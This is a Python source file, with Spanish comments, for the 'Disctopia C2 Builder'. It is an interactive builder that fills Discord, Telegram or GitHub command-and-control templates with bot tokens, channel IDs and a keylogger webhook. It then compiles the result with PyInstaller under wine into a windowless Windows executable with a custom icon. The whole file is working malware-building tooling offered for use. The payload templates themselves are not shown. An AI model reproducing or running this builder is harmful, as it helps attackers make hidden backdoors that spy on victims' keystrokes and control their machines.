import os
import subprocess
from prettytable import PrettyTable
from colorama import init, Fore, Style
from sys import platform as OS
import logging
from typing import Dict, List, Optional

# Inicializar Colorama para compatibilidad con terminales
init(autoreset=True)

# --- Configuración Global ---
ICON_FILE = "img/exe_file.ico"
PYINSTALLER_PATH = os.getenv("PYINSTALLER_PATH", "~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe")
DIST_DIR = "dist"
LOG_FILE = "builder.log"

# Configurar logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# --- Funciones Auxiliares ---
def print_msg(msg: str, msg_type: str = "info") -> None:
    """Imprime mensajes formateados con colores."""
    color_map = {
        "success": Fore.GREEN,
        "error": Fore.RED,
        "info": Fore.BLUE,
        "query": Fore.MAGENTA,
        "warning": Fore.YELLOW
    }
    
    prefix_map = {
        "success": "[+] ",
        "error": "[!] ",
        "info": "[*] ",
        "query": "[?] ",
        "warning": "[~] "
    }
    
    color = color_map.get(msg_type, "")
    prefix = prefix_map.get(msg_type, "")
    
    print(f"\n{color}{prefix}{msg}{Style.RESET_ALL}")
    logging.info(f"{prefix}{msg}")

def clear_screen() -> None:
    """Limpia la pantalla de la terminal."""
    os.system("cls" if OS == "win32" else "clear")

def create_table(settings: List[str], payload_type: str) -> Optional[PrettyTable]:
    """Crea una tabla con los ajustes del backdoor."""
    table = PrettyTable(["Configuración", "Valor"])
    table.add_row(["Nombre del Backdoor", settings[0]])

    if payload_type == "discord":
        table.add_row(["ID Servidor", settings[1]])
        table.add_row(["Token Bot", settings[2]])
        table.add_row(["ID Canal", settings[3]])
        table.add_row(["Webhook Keylogger", settings[4]])
    elif payload_type == "telegram":
        table.add_row(["ID Usuario", settings[1]])
        table.add_row(["Token Bot", settings[2]])
    elif payload_type == "github":
        table.add_row(["Token GitHub", settings[1]])
        table.add_row(["Repositorio GitHub", settings[2]])
    else:
        print_msg("Seleccione un Payload correcto.", "error")
        return None
    return table

def replace_placeholders(file_path: str, replacements: Dict[str, str]) -> Optional[str]:
    """Reemplaza los placeholders en un archivo con los valores proporcionados."""
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        for placeholder, value in replacements.items():
            if placeholder not in content:
                print_msg(f"Placeholder no encontrado: {placeholder}", "warning")
                
            content = content.replace(placeholder, str(value))
        
        return content
    except FileNotFoundError:
        print_msg(f"Error: Archivo no encontrado: {file_path}", "error")
        return None
    except Exception as e:
        print_msg(f"Error al reemplazar los marcadores de posición: {e}", "error")
        return None

def build_backdoor(backdoor_name: str, payload: str, data_list: List[str], pyinstaller_path: str) -> bool:
    """Construye el backdoor utilizando PyInstaller."""
    print_msg("Construyendo el backdoor...", "success")
    try:
        # Determinar la ruta del archivo de código fuente
        source_file = ""
        replacements = {}

        if payload == "discord":
            source_file = "code/discord/main.py"
            replacements = {
                "{GUILD}": str(data_list[1]),
                "{TOKEN}": str(data_list[2]),
                "{CHANNEL}": str(data_list[3]),
                "{KEYLOG_WEBHOOK}": str(data_list[4]),
            }
        elif payload == "telegram":
            source_file = "code/telegram/main.py"
            replacements = {
                "{BOT_TOKEN}": str(data_list[2]),
                "{USER_ID}": str(data_list[1]),
            }
        elif payload == "github":
            source_file = "code/github/main.py"
            replacements = {
                "{TOKEN}": str(data_list[1]),
                "{REPO}": str(data_list[2]),
            }
        else:
            print_msg("Payload no reconocido.", "error")
            return False

        # Reemplazar los placeholders en el archivo fuente
        new_code = replace_placeholders(source_file, replacements)
        if new_code is None:
            return False

        # Crear un archivo temporal con el código modificado
        temp_file = f"{backdoor_name}.py"
        with open(temp_file, 'w', encoding='utf-8') as f:
            f.write(new_code)

        # Construir la lanea de comandos para PyInstaller
        compile_command = [
            "wine",
            pyinstaller_path,
            "--onefile",
            "--noconsole",
            f"--icon={ICON_FILE}",
            temp_file,
        ]

        # Ejecutar el comando
        subprocess.run(compile_command, check=True)

        # Limpiar archivos temporales y el archivo .spec
        os.remove(temp_file)
        spec_file = f"{backdoor_name}.spec"
        if os.path.exists(spec_file):
            os.remove(spec_file)

        print_msg(f"\nEl Backdoor se encuentra en el directorio: \"{DIST_DIR}\"", "success")
        return True
    except FileNotFoundError:
        print_msg(f"PyInstaller no encontrado en: {pyinstaller_path}. Por favor, compruebe la ruta.", "error")
        return False
    except subprocess.CalledProcessError as e:
        print_msg(f"Error durante la compilacion (PyInstaller): {e}", "error")
        return False
    except Exception as e:
        print_msg(f"Error durante la compilacion: {e}", "error")
        return False

# --- Interfaz de Usuario ---
class CommandInterface:
    def __init__(self):
        self.settings = {
            "payload_type": "",
            "name": "",
            "guild_id": "",
            "bot_token": "",
            "channel_id": "",
            "webhook": "",
            "user_id": "",
            "github_token": "",
            "github_repo": ""
        }
        self.pyinstaller_path = os.path.expanduser(PYINSTALLER_PATH)

    def handle_command(self, command: str) -> None:
        """Manejador principal de comandos."""
        command_list = command.split()

        if command_list[0] == "exit":
            print_msg("Saliendo!", "success")
            exit()

        elif command_list[0] == "use":
            if len(command_list) < 2:
                print_msg("Especifique un payload!", "error")
                return
            
            selected_payload = command_list[1].lower()
            if selected_payload in ("discord", "telegram", "github"):
                self.settings["payload_type"] = selected_payload
                print_msg(f"Utilizando {selected_payload.capitalize()} C2", "success")
            else:
                print_msg("Payload no valido!", "error")
                return

            table = create_table(list(self.settings.values()), selected_payload)
            if table:
                print_msg(f"\n{table.get_string(title='Disctopia Backdoor Settings')}", "info")
                print_msg("Ejecutar 'help set' para mas información\n", "info")

        elif command_list[0] == "set":
            if len(command_list) < 3:
                print_msg("¡Por favor, especifique una configuración!", "error")
                return
            
            setting = command_list[1].lower()
            value = command_list[2]

            if not self.validate_setting(setting, value):
                return

            self.settings[setting] = value
            print_msg(f"Configuración {setting} establecida a {value}", "success")

        elif command_list[0] == "config":
            table = create_table(list(self.settings.values()), self.settings["payload_type"])
            if table:
                print_msg(f"\n{table.get_string(title='Disctopia Backdoor Settings')}", "info")

        elif command_list[0] == "clear":
            clear_screen()

        elif command_list[0] == "help":
            self.show_help(command_list)

        elif command_list[0] == "build":
            if not self.settings["name"]:
                print_msg("Por favor, establezca un nombre de Backdoor usando 'set name <name>'", "error")
                return

            print_msg("¿Esta seguro de que desea construir el BackDoor? (s/n)", "query")
            confirmation = input().lower()
            if confirmation == "s":
                build_backdoor(self.settings["name"], self.settings["payload_type"], list(self.settings.values()), self.pyinstaller_path)
            else:
                print_msg("Construcción cancelada.", "info")

        else:
            print_msg("Comando invalido.\n", "error")

    def validate_setting(self, key: str, value: str) -> bool:
        """Valida los valores de configuración."""
        validation_rules = {
            "name": (lambda v: 3 <= len(v) <= 50, "El nombre debe tener entre 3 y 50 caracteres."),
            "bot_token": (lambda v: len(v) >= 20, "El token debe ser valido y tener al menos 20 caracteres."),
            "guild_id": (lambda v: v.isdigit(), "El ID del servidor debe ser numerico."),
            "user_id": (lambda v: v.isdigit(), "El ID del usuario debe ser numerico."),
            "github_token": (lambda v: len(v) > 0, "El token de GitHub no puede estar vacao."),
            "github_repo": (lambda v: len(v) > 0, "El repositorio de GitHub no puede estar vacao."),
            "channel_id": (lambda v: v.isdigit(), "El ID del canal debe ser numerico."),
            "webhook": (lambda v: len(v) > 0, "El webhook no puede estar vacao."),
        }

        if key in validation_rules:
            validator, message = validation_rules[key]
            if not validator(value):
                print_msg(f"Error de validación: {message}", "error")
                return False
        return True

    def show_help(self, command_list: List[str]) -> None:
        """Muestra la ayuda para los comandos disponibles."""
        if len(command_list) == 1:
            print('''\n
        Help Menu:

        "help <command>" Muestra mas ayuda para un comando especafico

        "use <payload>" Selecciona un payload para utilizar

        "set <setting> <value>" Establece un valor a una configuración valida

        "config" Muestra la configuración y sus valores

        "build" Empaqueta la puerta trasera en un archivo EXE

        "update" Obtiene la última versión de Disctopia

        "exit" Finaliza el constructor
                    \n''')
        elif len(command_list) == 2:
            command_help = command_list[1].lower()
            if command_help == "use":
                print_msg("\nAyuda del comando 'use':", "info")
                print("  use <payload>")
                print("  Selecciona el payload a utilizar. Los payloads validos son: discord, telegram, github")
            elif command_help == "set":
                print_msg("\nAyuda del comando 'set':", "info")
                print("  set <setting> <value>")
                print("  Establece un valor para un ajuste especafico.")
                print("  Utilice 'config' para ver los ajustes disponibles para el payload seleccionado.")
            elif command_help == "config":
                print_msg("\nAyuda del comando 'config':", "info")
                print("  config")
                print("  Muestra los ajustes de configuración actuales para el payload seleccionado.")
            elif command_help == "build":
                print_msg("\nAyuda del comando 'build':", "info")
                print("  build")
                print("  Empaqueta la puerta trasera configurada en un archivo ejecutable (.exe).")
                print("  Asegúrese de haber configurado todos los parametros necesarios antes de compilar.")
            elif command_help == "update":
                print_msg("\nAyuda del comando 'update':", "info")
                print("  update (deshabilitado)")
                print("  Obtiene la última versión del constructor desde GitHub.")
            else:
                print_msg(f"Comando de ayuda desconocido: {command_help}", "error")
        else:
            print_msg("Formato de comando de ayuda no valido.", "error")

# --- Ejecución Principal ---
def main():
    clear_screen()
    print_msg("Disctopia C2 Builder", "info")
    
    interface = CommandInterface()
    
    try:
        while True:
            command = input(f"\n[{interface.settings['payload_type'] or 'none'}] > ").strip()
            if not command:
                continue
            
            interface.handle_command(command)
            
    except KeyboardInterrupt:
        print_msg("\nOperación cancelada por el usuario", "warning")
        sys.exit(1)
    except Exception as e:
        print_msg(f"Error critico: {str(e)}", "error")
        logging.critical(f"Error en main: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()